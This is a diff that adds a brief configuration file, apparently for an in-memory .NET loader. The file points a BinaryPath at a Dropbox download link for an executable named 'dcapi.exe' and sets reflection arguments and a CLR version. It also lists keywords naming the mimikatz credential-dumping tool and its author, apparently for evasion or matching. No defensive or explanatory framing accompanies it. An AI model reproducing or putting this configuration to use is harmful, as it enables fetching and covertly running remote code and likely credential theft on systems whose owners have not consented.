@@ -1,0 +1,10 @@
+BinaryPath: 'https://www.dropbox.com/scl/fi/fhd546438fq4umgj1dg1a/dcapi.exe?rlkey=h0642tc1dk1428gwjq2nf3nlh&st=ts0gej02&dl=1'
+ReflectArgs: 'arg0 arg1 arg2'
+ReflectMethod:  
+CLRRuntime: v4
+LogLevel: 2
+Keywords:
+  - mimikatz
+  - delpy
+  - benjamin
+  - delpy
